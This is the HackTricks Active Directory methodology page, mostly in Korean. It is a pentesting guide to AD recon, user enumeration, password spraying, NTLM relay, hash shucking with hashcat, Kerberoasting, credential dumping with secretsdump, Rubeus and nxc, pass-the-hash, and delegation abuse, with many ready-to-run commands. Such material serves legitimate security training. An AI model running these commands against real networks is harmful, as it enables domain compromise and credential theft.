# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## 기본 개요

**Active Directory**는 **network administrators**가 네트워크 내에서 **domains**, **users**, **objects**를 효율적으로 생성하고 관리할 수 있게 해주는 기반 기술입니다. 이는 확장성을 염두에 두고 설계되어, 대규모 사용자를 관리 가능한 **groups**와 **subgroups**로 조직하는 동시에 여러 수준에서 **access rights**를 제어할 수 있게 합니다.

**Active Directory**의 구조는 세 가지 주요 계층인 **domains**, **trees**, **forests**로 구성됩니다. **domain**은 공통 데이터베이스를 공유하는 **users**나 **devices** 같은 객체들의 집합을 포함합니다. **trees**는 공유 구조로 연결된 이러한 domain들의 그룹이며, **forest**는 **trust relationships**를 통해 서로 연결된 여러 tree들의 집합을 의미하고, 조직 구조의 최상위 계층을 형성합니다. 각 수준마다 특정 **access** 및 **communication rights**를 지정할 수 있습니다.

**Active Directory**의 주요 개념은 다음과 같습니다:

1. **Directory** – Active Directory objects와 관련된 모든 정보를 저장합니다.
2. **Object** – 디렉터리 내의 엔터티를 의미하며, **users**, **groups**, 또는 **shared folders**를 포함합니다.
3. **Domain** – 디렉터리 객체를 담는 컨테이너 역할을 하며, 여러 domain이 하나의 **forest** 안에서 공존할 수 있고 각자 자체 객체 집합을 유지합니다.
4. **Tree** – 공통 root domain을 공유하는 domain들의 그룹입니다.
5. **Forest** – Active Directory의 조직 구조 최상단으로, 여러 tree로 구성되며 그들 사이에 **trust relationships**가 존재합니다.

**Active Directory Domain Services (AD DS)**는 네트워크 내 중앙 집중식 관리와 통신에 중요한 다양한 서비스를 포함합니다. 이러한 서비스는 다음과 같습니다:

1. **Domain Services** – 데이터 저장을 중앙화하고 **users**와 **domains** 간의 상호작용을 관리하며, **authentication** 및 **search** 기능을 포함합니다.
2. **Certificate Services** – 안전한 **digital certificates**의 생성, 배포 및 관리를 담당합니다.
3. **Lightweight Directory Services** – **LDAP protocol**을 통해 directory-enabled applications를 지원합니다.
4. **Directory Federation Services** – 단일 세션에서 여러 웹 애플리케이션에 걸쳐 사용자를 인증할 수 있는 **single-sign-on** 기능을 제공합니다.
5. **Rights Management** – 무단 배포와 사용을 규제하여 저작권 자료 보호를 돕습니다.
6. **DNS Service** – **domain names** 해석에 필수적입니다.

더 자세한 설명은 다음을 확인하세요: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

**AD를 공격**하는 방법을 배우려면 **Kerberos authentication process**를 정말 잘 **understand**해야 합니다.\
[**아직 어떻게 동작하는지 모른다면 이 페이지를 읽으세요.**](kerberos-authentication.md)

## Cheat Sheet

다음 사이트에서 많은 정보를 얻을 수 있습니다: [https://wadcoms.github.io/](https://wadcoms.github.io) 를 통해 AD를 열거/exploit할 때 실행할 수 있는 명령을 빠르게 확인할 수 있습니다.

> [!WARNING]
> Kerberos communication은 작업을 수행하려면 **full qualifid name (FQDN)**이 필요합니다. IP address로 머신에 접근하려고 하면 **NTLM을 사용하고 kerberos는 사용하지 않습니다**.

## Recon Active Directory (No creds/sessions)

AD 환경에 접근할 수는 있지만 credentials/sessions가 없다면 다음을 할 수 있습니다:

- **Pentest the network:**
- 네트워크를 스캔하고, 머신과 열린 포트를 찾아 **vulnerabilities**를 **exploit**하거나 그 안에서 **credentials**를 추출해 보세요(예를 들어, [printers could be very interesting targets](ad-information-in-printers.md)일 수 있습니다).
- DNS를 열거하면 web, printers, shares, vpn, media 등 도메인 내 핵심 서버에 대한 정보를 얻을 수 있습니다.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 더 자세한 정보는 일반적인 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)를 참고하세요.
- **smb services에서 null 및 Guest access를 확인**하세요(현대 Windows 버전에서는 동작하지 않습니다):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- SMB server를 열거하는 더 자세한 가이드는 여기에서 찾을 수 있습니다:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Ldap enumerate**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- LDAP를 열거하는 더 자세한 가이드는 여기에서 찾을 수 있습니다(**anonymous access**에 특히 주의하세요):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- [**Responder로 서비스인 척하여**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) credentials 수집
- [**relay attack를 악용하여**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) host에 접근
- [**evil-S로 가짜 UPnP services를 노출하여**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) credentials 수집
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 내부 문서, 소셜 미디어, 도메인 환경 내부의 서비스(주로 web), 그리고 공개적으로 उपलब्ध한 자료에서 usernames/names를 추출합니다.
- 회사 직원의 전체 이름을 찾았다면, 여러 AD **username conventions (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/))를 시도해 볼 수 있습니다. 가장 흔한 규칙은 다음과 같습니다: _NameSurname_, _Name.Surname_, _NamSur_ (각각 3글자), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3개의 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html)와 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 페이지를 확인하세요.
- **Kerbrute enum**: **invalid username**가 요청되면 서버는 **Kerberos error** 코드 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_을 반환하며, 이를 통해 해당 username이 유효하지 않음을 알 수 있습니다. **Valid usernames**는 **AS-REP** 응답에서 **TGT**를 반환하거나, 사용자가 pre-authentication을 수행해야 함을 나타내는 에러 _KRB5KDC_ERR_PREAUTH_REQUIRED_를 반환합니다.
- **No Authentication against MS-NRPC**: 도메인 컨트롤러의 MS-NRPC (Netlogon) 인터페이스에 대해 auth-level = 1 (No authentication)을 사용합니다. 이 방법은 MS-NRPC 인터페이스에 바인딩한 뒤 `DsrGetDcNameEx2` 함수를 호출하여 어떤 credentials도 없이 user 또는 computer의 존재 여부를 확인합니다. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) tool이 이 유형의 enumeration을 구현합니다. 연구 자료는 [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)에서 확인할 수 있습니다.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

네트워크에서 이러한 서버 중 하나를 찾았다면, 이에 대해 **user enumeration**도 수행할 수 있습니다. 예를 들어, [**MailSniper**](https://github.com/dafthack/MailSniper) 도구를 사용할 수 있습니다:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> 사용자 이름 목록은 [**이 github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) 와 이곳([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames))에서 찾을 수 있습니다.
>
> 하지만, 이 전에 수행했어야 할 recon 단계에서 **회사에서 일하는 사람들의 이름**을 알아두었어야 합니다. 이름과 성을 알면 스크립트 [**namemash.py**](https://gist.github.com/superkojiman/11076951)를 사용해 가능한 유효한 usernames를 생성할 수 있습니다.

### 하나 또는 여러 개의 usernames를 알고 있는 경우

좋습니다, 이미 유효한 username은 알고 있지만 passwords는 없는 상태입니다... 그러면 다음을 시도하세요:

- [**ASREPRoast**](asreproast.md): 사용자가 _DONT_REQ_PREAUTH_ 속성을 **가지고 있지 않다면** 그 사용자에 대해 **AS_REP message**를 요청할 수 있으며, 여기에는 사용자의 password 파생값으로 암호화된 일부 data가 포함됩니다.
- [**Password Spraying**](password-spraying.md): 발견된 각 users에 대해 가장 **흔한 passwords**를 시도해 보세요. 어떤 사용자는 약한 password를 사용 중일 수 있습니다(비밀번호 정책을 기억하세요!).
- 또한 **OWA servers**를 spray해서 users의 mail servers에 접근을 시도할 수도 있습니다.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

네트워크의 일부 protocol을 **poisoning**해서 취약한 **hashes**를 **얻을** 수도 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

active directory를 열거하는 데 성공했다면, 더 많은 emails와 네트워크에 대한 더 나은 이해를 얻었을 것입니다. AD env에 접근하기 위해 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)를 강제로 유도할 수도 있습니다.

### NetExec workspace-driven recon & relay posture checks

- **`nxcdb` workspaces**를 사용해 각 engagement의 AD recon 상태를 유지하세요: `workspace create <name>`는 `~/.nxc/workspaces/<name>` 아래에 프로토콜별 SQLite DB(smb/mssql/winrm/ldap/etc)를 생성합니다. `proto smb|mssql|winrm`로 보기를 전환하고 `creds`로 수집된 secrets를 확인할 수 있습니다. 작업이 끝나면 민감한 데이터는 수동으로 삭제하세요: `rm -rf ~/.nxc/workspaces/<name>`.
- **`netexec smb <cidr>`**로 빠르게 subnet discovery를 하면 **domain**, **OS build**, **SMB signing requirements**, **Null Auth**를 확인할 수 있습니다. `(signing:False)`로 표시된 members는 **relay-prone**이며, DCs는 종종 signing이 필요합니다.
- 타깃팅을 쉽게 하려면 NetExec output에서 바로 **/etc/hosts**에 **hostnames**를 생성하세요:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- **SMB relay to the DC가 signing으로 차단되더라도**, 여전히 **LDAP** 설정을 확인하라: `netexec ldap <dc>`는 `(signing:None)` / weak channel binding을 강조한다. SMB signing은 필요하지만 LDAP signing은 비활성화된 DC는 **SPN-less RBCD** 같은 abuse에 대해 여전히 유효한 **relay-to-LDAP** target이다.

### Client-side printer credential leaks → bulk domain credential validation

- Printer/web UI는 때때로 **masked admin passwords를 HTML에 내장**한다. source/devtools를 보면 cleartext가 드러날 수 있다(예: `<input value="<password>">`), 이를 통해 Basic-auth access로 scan/print repositories에 접근할 수 있다.
- 가져온 print jobs에는 사용자별 passwords가 포함된 **plaintext onboarding docs**가 있을 수 있다. 테스트할 때 pairings를 정확히 맞춰라:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

**null or guest user**로 다른 PC나 share에 **접근할 수 있다면**, **파일**(예: SCF file)을 배치할 수 있고, 누군가 그것에 접근하면 **NTLM authentication을 당신에게 트리거**해서 **NTLM challenge**를 훔쳐 crack할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking**은 이미 보유한 모든 NT hash를, key material이 NT hash에서 직접 파생되는 다른 느린 format의 candidate password로 취급합니다. Kerberos RC4 tickets, NetNTLM challenges, 또는 cached credentials에서 긴 passphrase를 brute-force하는 대신, NT hash를 Hashcat의 NT-candidate modes에 넣어 plaintext를 알지 못한 채 password reuse를 검증합니다. 이는 domain compromise 이후 수천 개의 현재 및 과거 NT hash를 수집할 수 있을 때 특히 강력합니다.

다음 경우 shucking을 사용하세요:

- DCSync, SAM/SECURITY dumps, 또는 credential vaults에서 NT corpus를 확보했고, 다른 domains/forests에서 reuse를 테스트해야 할 때.
- RC4 기반 Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, 또는 DCC/DCC2 blobs를 캡처했을 때.
- 길고 crack 불가능한 passphrase의 reuse를 빠르게 증명하고 즉시 Pass-the-Hash로 pivot하고 싶을 때.

이 technique은 key가 NT hash가 아닌 encryption types에는 **작동하지 않습니다**(예: Kerberos etype 17/18 AES). domain이 AES-only를 강제하면, 일반 password modes로 돌아가야 합니다.

#### Building an NT hash corpus

- **DCSync/NTDS** – `secretsdump.py`를 history와 함께 사용해 가능한 가장 큰 NT hash 집합(및 이전 값들)을 가져오세요:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

history entries는 candidate pool을 크게 넓혀줍니다. Microsoft는 계정당 최대 24개의 이전 hash를 저장할 수 있기 때문입니다. NTDS secrets를 수집하는 더 많은 방법은 여기서 보세요:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (또는 Mimikatz `lsadump::sam /patch`)는 local SAM/SECURITY data와 cached domain logons (DCC/DCC2)를 추출합니다. 중복을 제거하고 그 hash들을 같은 `nt_candidates.txt` 목록에 추가하세요.
- **Track metadata** – 각 hash를 생성한 username/domain을 유지하세요(비록 wordlist에 hex만 있어도). Hashcat이 winning candidate를 출력하면, 일치하는 hash는 어떤 principal이 password를 reuse하는지 즉시 알려줍니다.
- 같은 forest 또는 trusted forest의 candidate를 우선하세요. shucking 시 겹칠 가능성을 극대화합니다.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. rule engines는 비활성화하세요(`-r` 금지, hybrid modes 금지). mangling이 candidate key material을 손상시키기 때문입니다.
- 이 modes가 본질적으로 더 빠른 것은 아니지만, NTLM keyspace(~30,000 MH/s on an M3 Max)는 Kerberos RC4(~300 MH/s)보다 약 100배 빠릅니다. 선별된 NT list를 테스트하는 것은 느린 format에서 전체 password space를 탐색하는 것보다 훨씬 저렴합니다.
- 항상 **최신 Hashcat build**(`git clone https://github.com/hashcat/hashcat && make install`)를 사용하세요. modes 31500/31600/35300/35400은 최근에 추가되었습니다.
- 현재 AS-REQ Pre-Auth용 NT mode는 없으며, AES etypes (19600/19700)는 plaintext password가 필요합니다. key가 raw NT hash가 아니라 UTF-16LE passwords에서 PBKDF2로 파생되기 때문입니다.

#### Example – Kerberoast RC4 (mode 35300)

1. 낮은 권한의 user로 target SPN에 대한 RC4 TGS를 캡처하세요(자세한 내용은 Kerberoast page 참조):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. NT list로 ticket을 shuck하세요:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat은 각 NT candidate에서 RC4 key를 파생하고 `$krb5tgs$23$...` blob을 검증합니다. 일치가 나오면 service account가 기존 NT hash 중 하나를 사용한다는 뜻입니다.

3. 즉시 PtH로 pivot하세요:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

필요하다면 나중에 `hashcat -m 1000 <matched_hash> wordlists/`로 plaintext를 복구할 수도 있습니다.

#### Example – Cached credentials (mode 31600)

1. compromised workstation에서 cached logons를 덤프하세요:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 흥미로운 domain user의 DCC2 line을 `dcc2_highpriv.txt`에 복사하고 shuck하세요:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 성공적으로 일치하면 list에서 이미 알고 있던 NT hash가 나오며, cached user가 password를 reuse하고 있음을 증명합니다. 이를 바로 PtH(`nxc smb <dc_ip> -u highpriv -H <hash>`)에 사용하거나, 빠른 NTLM mode에서 brute-force하여 문자열을 복구하세요.

동일한 workflow는 NetNTLM challenge-responses(`-m 27000/27100`)와 DCC(`-m 31500`)에도 그대로 적용됩니다. 일치가 확인되면 relay, SMB/WMI/WinRM PtH를 실행하거나, offline에서 masks/rules로 NT hash를 다시 crack할 수 있습니다.



## Enumerating Active Directory WITH credentials/session

이 단계에서는 **유효한 domain account의 credentials 또는 session을 탈취해야 합니다.** 유효한 credentials가 있거나 domain user로 shell이 있다면, **이전의 옵션들도 여전히 다른 user를 compromise하는 데 사용할 수 있다는 점**을 기억해야 합니다.

authenticated enumeration을 시작하기 전에 **Kerberos double hop problem**이 무엇인지 알아야 합니다.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

계정을 compromise하는 것은 **전체 domain을 compromise하기 위한 큰 단계**입니다. 왜냐하면 이제 **Active Directory Enumeration**을 시작할 수 있기 때문입니다:

[**ASREPRoast**](asreproast.md)와 관련해서는 이제 취약한 모든 user를 찾을 수 있고, [**Password Spraying**](password-spraying.md)과 관련해서는 **모든 username 목록**을 얻어 compromised account의 password, empty passwords, 그리고 새로 유망한 passwords를 시도할 수 있습니다.

- [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)을 사용할 수 있습니다.
- 더 은밀한 [**powershell for recon**](../basic-powershell-for-pentesters/index.html)도 사용할 수 있습니다.
- 더 자세한 정보를 추출하기 위해 [**use powerview**](../basic-powershell-for-pentesters/powerview.md)도 사용할 수 있습니다.
- active directory에서 recon을 위한 또 다른 훌륭한 tool은 [**BloodHound**](bloodhound.md)입니다. 이것은 사용한 collection methods에 따라 **그다지 stealthy하지는 않지만**, **그런 점이 중요하지 않다면** 꼭 시도해볼 가치가 있습니다. 사용자가 RDP 가능한 곳, 다른 groups로 가는 path 등을 찾으세요.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD의 DNS records**](ad-dns-records.md)는 흥미로운 정보를 담고 있을 수 있습니다.
- directory를 enumerate하는 데 사용할 수 있는 **GUI를 가진 tool**은 **SysInternal** Suite의 **AdExplorer.exe**입니다.
- 또한 **ldapsearch**로 LDAP database를 검색하여 _userPassword_ & _unixUserPassword_ 필드, 또는 _Description_에서 credentials를 찾을 수 있습니다. 다른 방법은 [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment)를 참고하세요.
- **Linux**를 사용 중이라면 [**pywerview**](https://github.com/the-useless-one/pywerview)를 사용해 domain을 enumerate할 수도 있습니다.
- 다음과 같은 automated tools도 시도해볼 수 있습니다:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Windows에서는 모든 domain username을 쉽게 얻을 수 있습니다(`net user /domain` ,`Get-DomainUser` 또는 `wmic useraccount get name,sid`). Linux에서는 다음을 사용할 수 있습니다: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 또는 `enum4linux -a -u "user" -p "password" <DC IP>`

> 이 Enumeration section은 작아 보여도 사실 가장 중요한 부분입니다. 링크들(주로 cmd, powershell, powerview, BloodHound)을 열어 domain을 enumerate하는 법을 배우고, 익숙해질 때까지 연습하세요. assessment 동안 이것이 DA로 가는 길을 찾거나, 아니면 더 이상 할 수 있는 것이 없다고 판단하는 핵심 순간이 됩니다.

### Kerberoast

Kerberoasting은 user account에 연결된 services가 사용하는 **TGS tickets**를 얻고, 그 암호화를 crack하는 것입니다. 이 암호화는 user passwords를 기반으로 하며, **offline**에서 수행됩니다.

자세한 내용은 여기서 보세요:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

credentials를 얻은 뒤, 어떤 **machine**에 접근할 수 있는지 확인할 수 있습니다. 이를 위해 **CrackMapExec**을 사용해 포트 스캔 결과에 맞춰 여러 protocol로 여러 server에 연결을 시도할 수 있습니다.

### Local Privilege Escalation

일반 domain user로 compromised credentials나 session을 얻었고, 이 user로 domain 내 **어떤 machine에든 access**할 수 있다면, **local privilege를 escalate**하고 credentials를 looting할 방법을 찾아야 합니다. local administrator privileges가 있어야만 메모리(LSASS)와 local(SAM)에서 **다른 user들의 hashes를 dump**할 수 있기 때문입니다.

이 책에는 [**Windows에서의 local privilege escalation**](../windows-local-privilege-escalation/index.html)과 [**checklist**](../checklist-windows-privilege-escalation.md)에 대한 완전한 페이지가 있습니다. 또한 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)도 잊지 마세요.

### Current Session Tickets

현재 user에게 **예상치 못한 resources에 접근할 권한을 주는 tickets**를 찾을 가능성은 매우 **낮지만**, 다음을 확인할 수 있습니다:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

active directory를 열거하는 데 성공했다면 **더 많은 이메일**과 **네트워크에 대한 더 나은 이해**를 얻었을 것입니다. **NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**를 강제로 수행할 수 있을지도 모릅니다.**

### Looks for Creds in Computer Shares | SMB Shares

이제 기본적인 credentials가 있으므로 **AD 내부에서 공유되는 흥미로운 파일**을 **찾을 수 있는지** 확인해야 합니다. 수동으로 할 수도 있지만, 매우 지루하고 반복적인 작업입니다(특히 확인해야 할 문서가 수백 개라면 더 그렇습니다).

[**사용할 수 있는 tools에 대해 알아보려면 이 링크를 따라가세요.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

다른 PC나 share에 **접근할 수 있다면**, 누군가가 접근했을 때 **당신에게 NTLM authentication을 트리거**하도록 하는 **파일**(예: SCF file)을 **배치**할 수 있습니다. 그러면 NTLM challenge를 **steal**해서 crack할 수 있습니다:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

이 취약점은 인증된 어떤 사용자든 **domain controller를 compromise**할 수 있게 했습니다.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**다음 technique들은 일반 domain user만으로는 부족하며, 이러한 attacks를 수행하려면 특별한 privileges/credentials가 필요합니다.**

### Hash extraction

AsRepRoast, [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html)를 사용해 일부 local admin 계정을 **compromise**하는 데 성공했기를 바랍니다.\
그렇다면 이제 memory와 local에 있는 모든 hashes를 dump할 차례입니다.\
[**해시를 얻는 다양한 방법에 대해 이 페이지를 읽어보세요.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**사용자의 hash를 얻었다면**, 그것을 사용해 그 사용자를 **impersonate**할 수 있습니다.\
그 hash를 사용해 **NTLM authentication을 수행하는** **tool**을 사용해야 하며, **또는** 새로운 **sessionlogon**을 만들고 그 hash를 **LSASS** 안에 **inject**할 수 있습니다. 그러면 어떤 **NTLM authentication**이 수행되든 그 hash가 사용됩니다. 마지막 옵션이 mimikatz가 하는 방식입니다.\
[**자세한 내용은 이 페이지를 읽어보세요.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

이 공격은 일반적인 NTLM protocol 기반 Pass The Hash 대신, **사용자의 NTLM hash를 사용해 Kerberos ticket을 요청**하는 것을 목표로 합니다. 따라서 이는 특히 **NTLM protocol이 비활성화되어 있고 Kerberos만 authentication protocol로 허용되는 네트워크**에서 매우 **유용**할 수 있습니다.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** 공격 방식에서 공격자는 비밀번호나 hash value 대신 **사용자의 authentication ticket을 steal**합니다. 그런 다음 이 stolen ticket을 사용해 **사용자를 impersonate**하고, 네트워크 내 리소스와 서비스에 대한 무단 접근을 얻습니다.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

**local administrator의 hash** 또는 **password**가 있다면, 그것으로 다른 **PCs**에 **local login**을 시도해야 합니다.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Note that this is quite **noisy** and **LAPS** would **mitigate** it.

### MSSQL Abuse & Trusted Links

If a user has privileges to **access MSSQL instances**, he could be able to use it to **execute commands** in the MSSQL host (if running as SA), **steal** the NetNTLM **hash** or even perform a **relay** **attack**.\
Also, if a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. These trusts can be chained and at some point the user might be able to find a misconfigured database where he can execute commands.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Third-party inventory and deployment suites often expose powerful paths to credentials and code execution. See:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

If you find any Computer object with the attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) and you have domain privileges in the computer, you will be able to dump TGTs from memory of every users that logins onto the computer.\
So, if a **Domain Admin logins onto the computer**, you will be able to dump his TGT and impersonate him using [Pass the Ticket](pass-the-ticket.md).\
Thanks to constrained delegation you could even **automatically compromise a Print Server** (hopefully it will be a DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

If a user or computer is allowed for "Constrained Delegation" it will be able to **impersonate any user to access some services in a computer**.\
Then, if you **compromise the hash** of this user/computer you will be able to **impersonate any user** (even domain admins) to access some services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Having **WRITE** privilege on an Active Directory object of a remote computer enables the attainment of code execution with **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

The compromised user could have some **interesting privileges over some domain objects** that could let you **move** laterally/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Discovering a **Spool service listening** within the domain can be **abused** to **acquire new credentials** and **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

If **other users** **access** the **compromised** machine, it's possible to **gather credentials from memory** and even **inject beacons in their processes** to impersonate them.\
Usually users will access the system via RDP, so here you have how to performa couple of attacks over third party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** provides a system for managing the **local Administrator password** on domain-joined computers, ensuring it's **randomized**, unique, and frequently **changed**. These passwords are stored in Active Directory and access is controlled through ACLs to authorized users only. With sufficient permissions to access these passwords, pivoting to other computers becomes possible.


{{#ref}}
laps.md
{{#endref}}

